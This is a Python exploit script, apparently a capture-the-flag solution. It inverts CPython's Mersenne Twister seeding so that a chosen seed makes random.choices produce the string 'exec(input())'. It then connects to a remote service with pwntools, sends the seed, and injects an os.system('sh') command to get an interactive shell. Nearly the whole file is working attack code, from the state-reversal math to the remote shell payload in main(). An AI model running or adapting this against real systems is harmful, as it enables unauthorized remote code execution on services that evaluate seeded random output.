#!/usr/bin/env python3.7

import random
import string


N = 624
M = 2 ** 32


def init_genrand(state, s):
    state[0] = s

    for i in range(1, N):
        state[i] = ((1812433253 * (state[i - 1] ^ (state[i - 1] >> 30))) % M) + i
    
    return i


def init_by_array(state, array):
    init_genrand(state, 19650218)
    
    i = 1
    j = 0
    
    for _ in range(max(N, len(array))):
        state[i] = ((state[i] ^ (((state[i - 1] ^ (state[i - 1] >> 30)) * 1664525) % M)) + array[j] + j) % M
        i += 1
        j += 1
        if i >= N:
            state[0] = state[N - 1]
            i = 1
        if j >= len(array):
            j = 0
    
    for _ in range(N - 1):
        state[i] = ((state[i] ^ (((state[i - 1] ^ (state[i - 1] >> 30)) * 1566083941) % M)) - i) % M
        i += 1
        if i >= N:
            state[0] = state[N - 1]
            i = 1
        
    state[0] = 0x80000000


def temper(x):
    x ^= (x >> 11)
    x ^= (x << 7) & 0x9d2c5680
    x ^= (x << 15) & 0xefc60000
    x ^= (x >> 18)
    return x


def detemper(x):
    x ^= (x >> 18)
    x ^= (x << 15) & 0xEFC60000
    x ^= (x << 7) & 0x1680
    x ^= (x << 7) & 0xC4000
    x ^= (x << 7) & 0xD200000
    x ^= (x << 7) & 0x90000000
    x ^= (x >> 11) & 0xFFC00000
    x ^= (x >> 11) & 0x3FF800
    x ^= (x >> 11) & 0x7FF
    return x


def twist(state):
    for i in range(N):
        y = ((state[i] & 0x80000000) + (state[(i + 1) % N] & 0x7fffffff)) % M
        state[i] = state[(i + 397) % N] ^ (y >> 1)
        if y & 2:
            state[i] = state[i] ^ 0x9908b0df


def untwist(state):
    for i in reversed(range(N)):
        result = 0
        tmp = state[i]
        tmp ^= state[(i + 397) % N]
        if ((tmp & 0x80000000) == 0x80000000):
            tmp ^= 0x9908b0df
        result = (tmp << 1) & 0x80000000
        tmp = state[(i - 1 + N) % N]
        tmp ^= state[(i + 397 - 1) % N]
        if ((tmp & 0x80000000) == 0x80000000):
            tmp ^= 0x9908b0df
            result |= 1
        result |= (tmp << 1) & 0x7fffffff
        state[i] = result


def calculate_expected_state(s):
    positions = list(map(string.printable.index, s))
    state = []
    
    for position in positions:
        # 0.0099 is magic constant
        value = int((position / len(string.printable) + 0.0099) * 9007199254740992 / 67108864)
        value <<= 5
        assert value < M
        state.extend([value, 0])
    
    state += [0] * (N - len(state))
    return state


def calculate_expected_array(state):
    state = state[:]
    
    for i in reversed(range(1, N)):
        state[i] = ((state[i] + i) % M) ^ (((state[i - 1] ^ (state[i - 1] >> 30)) * 1566083941) % M)

    state[N - 1] = state[0]

    clear = [0] * N
    init_genrand(clear, 19650218)

    array = []
    j = 0

    for i in range(1, N):
        clear[i] = ((clear[i] ^ (((clear[i - 1] ^ (clear[i - 1] >> 30)) * 1664525) % M)) + j) % M
        array.append((-clear[i]) % M)
        clear[i] = 0
        j += 1

    clear[0] = 0

    for i in range(1, N):
        clear[i] = ((clear[i] ^ (((clear[i - 1] ^ (clear[i - 1] >> 30)) * 1664525) % M)) + j) % M
        array.append((-clear[i] + state[i]) % M)
        clear[i] = state[i]
        j += 1
    
    return array


def calculate_seed(array):
    seed = 0
    
    for i in reversed(range(len(array))):
        seed = seed * M + array[i]
    
    return seed


def generate_payload(seed, length):
    random.seed(seed)

    return ''.join(random.choices(string.printable, k=length))


def generate_solution(text):
    state = calculate_expected_state(text)
    state = list(map(detemper, state))
    untwist(state)
    array = calculate_expected_array(state)
    seed = calculate_seed(array)
    return seed, len(text)


def test_random_internals():
    # first generate a seed from 32-bit ints array
    array = [12345, 23456, 34567, 45678, 56789]
    seed = calculate_seed(array)

    # next compare result of init_by_array
    rnd = random.Random()
    rnd.seed(seed)
    rnd_state = list(rnd.getstate()[1][:N])
    
    state = [0] * N
    init_by_array(state, array)

    assert state == rnd_state

    # then compare 32-bit output
    rnd_value = rnd.getrandbits(32)
    
    twist(state)
    value = temper(state[0])
    
    assert value == rnd_value

    # random internals implementation works


def main():
    import sys

    test_random_internals()
    
    cmd = 'exec(input())'
    seed, length = generate_solution(cmd)

    payload = generate_payload(seed, length)

    print(seed)
    print(length)

    print(payload, file=sys.stderr)

    if len(sys.argv) > 1:
        from pwn import remote

        IP = sys.argv[1]
        PORT = 7704

        with remote(IP, PORT) as io:
            io.sendlineafter(b':', str(seed).encode())
            io.sendlineafter(b':', str(length).encode())
            io.sendline(b'import os; os.system("sh")')
            io.interactive()


if __name__ == '__main__':
    main()
